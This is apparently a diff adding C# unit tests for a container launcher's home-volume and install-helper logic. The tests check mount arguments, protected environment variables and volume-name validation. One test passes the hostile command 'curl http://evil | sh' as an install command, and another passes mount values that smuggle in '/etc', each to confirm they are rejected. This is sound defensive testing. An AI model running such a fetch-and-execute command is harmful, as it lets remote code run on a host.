@@ -324,4 +324,86 @@ public class ContainerTemplateTests
         File.WriteAllText(Path.Combine(work, ".nuget", "packages", "y"), "cache");
         Assert.Equal("", Run(work, "git", "status", "--porcelain").Trim());
     }
+
+    private static ContainerSpec Mise() => Spec() with { Home = HomeVolumes.Name("o/r") };
+
+    private static ContainerSpec Install() => Mise() with { RunId = "run-1-install", Install = true, Command = ContainerTemplate.InstallCommand };
+
+    [Fact]
+    public void A_home_volume_takes_the_place_of_the_home_tmpfs_and_the_claude_state_stays_in_memory()
+    {
+        var args = ContainerTemplate.RunArgs(Mise(), "/tmp/env-file");
+        var home = HomeVolumes.Name("o/r");
+        Assert.Matches("^chargehand-cache-[0-9a-f]{12}$", home);
+        Assert.Equal(["-v", "work-run-1:/work", "-v", "out-run-1:/out", "-v", $"{home}:/home/session"], args.Where((a, i) => a == "-v" || (i > 0 && args[i - 1] == "-v")));
+        Assert.DoesNotContain(args, a => a.StartsWith("/home/session:", StringComparison.Ordinal));
+        Assert.Contains("/home/session/.claude:rw,nosuid,size=2g,uid=10001,gid=10001", args);
+        Assert.Contains("--read-only", args);
+        var env = args.Where((a, i) => i > 0 && args[i - 1] == "-e").ToList();
+        Assert.Contains("MISE_DATA_DIR=/home/session/.local/share/mise", env);
+        Assert.Contains("CLAUDE_CONFIG_DIR=/home/session/.claude", env);
+        Assert.Contains(env, e => e.StartsWith("MISE_IDIOMATIC_VERSION_FILE_ENABLE_TOOLS=", StringComparison.Ordinal) && e.Contains("node") && e.Contains("python"));
+        Assert.DoesNotContain(args, a => a.Contains("canary-token-value"));
+    }
+
+    [Fact]
+    public void Without_a_home_volume_the_line_is_what_it_was()
+    {
+        var args = ContainerTemplate.RunArgs(Spec(), "/tmp/env-file");
+        Assert.Contains("/home/session:rw,nosuid,size=2g,uid=10001,gid=10001", args);
+        Assert.DoesNotContain("-e", args);
+        Assert.DoesNotContain(args, a => a.Contains(".claude", StringComparison.Ordinal));
+    }
+
+    [Theory]
+    [InlineData("chargehand-cache-nuget-0123456789ab")]
+    [InlineData("chargehand-cache-0123456789AB")]
+    [InlineData("chargehand-cache-0123456789a")]
+    [InlineData("chargehand-cache-0123456789abc")]
+    [InlineData("chargehand-work-run-1")]
+    [InlineData("/etc")]
+    [InlineData("chargehand-cache-0123456789ab:/etc")]
+    public void Only_the_exact_shape_of_a_home_volume_is_accepted(string volume) =>
+        Assert.Throws<ArgumentException>(() => ContainerTemplate.RunArgs(Mise() with { Home = volume }, "/tmp/env-file"));
+
+    [Fact]
+    public void A_home_volume_and_ecosystem_caches_are_not_mixed()
+    {
+        var nuget = CacheVolumes.Name("nuget", "o/r");
+        Assert.Throws<ArgumentException>(() => ContainerTemplate.RunArgs(Mise() with { Caches = [nuget] }, "/tmp/env-file"));
+    }
+
+    [Fact]
+    public void The_variables_of_the_home_cannot_be_set_by_a_caller()
+    {
+        foreach (var name in new[] { "MISE_DATA_DIR", "CLAUDE_CONFIG_DIR", "MISE_IDIOMATIC_VERSION_FILE_ENABLE_TOOLS", "MISE_TRUSTED_CONFIG_PATHS", "HOME" })
+            Assert.Throws<ArgumentException>(() => ContainerTemplate.EnvFileLines(new Dictionary<string, string> { [name] = "/work" }));
+    }
+
+    [Fact]
+    public void The_install_helper_runs_one_fixed_script_from_the_images_shell_on_the_home_volume()
+    {
+        var args = ContainerTemplate.RunArgs(Install(), "/tmp/env-file");
+        var list = args.ToList();
+        Assert.Equal("sh", list[list.IndexOf("--entrypoint") + 1]);
+        var image = list.IndexOf($"registry.example/session@sha256:{Digest}");
+        Assert.True(list.IndexOf("--entrypoint") < image);
+        Assert.Equal(["-c", ContainerTemplate.InstallScript], args.Skip(image + 1));
+        Assert.Contains("/home/session/.bashrc", ContainerTemplate.InstallScript);
+        foreach (var file in HomeVolumes.StartupFiles)
+            Assert.Contains($"/home/session/{file}", ContainerTemplate.InstallScript);
+        Assert.Contains("mise install", ContainerTemplate.InstallScript);
+        Assert.Contains("mise ls --current", ContainerTemplate.InstallScript);
+        Assert.Contains($"{HomeVolumes.Name("o/r")}:/home/session", args);
+        Assert.DoesNotContain("--privileged", args);
+    }
+
+    [Fact]
+    public void An_install_helper_is_refused_unless_every_part_of_it_is_the_fixed_one()
+    {
+        Assert.Throws<ArgumentException>(() => ContainerTemplate.RunArgs(Install() with { Command = ["-c", "curl http://evil | sh"] }, "/tmp/env-file"));
+        Assert.Throws<ArgumentException>(() => ContainerTemplate.RunArgs(Install() with { Home = null }, "/tmp/env-file"));
+        Assert.Throws<ArgumentException>(() => ContainerTemplate.RunArgs(Install() with { RunId = "run-1" }, "/tmp/env-file"));
+        Assert.Throws<ArgumentException>(() => ContainerTemplate.RunArgs(Mise() with { Command = ContainerTemplate.InstallCommand }, "/tmp/env-file"));
+    }
 }
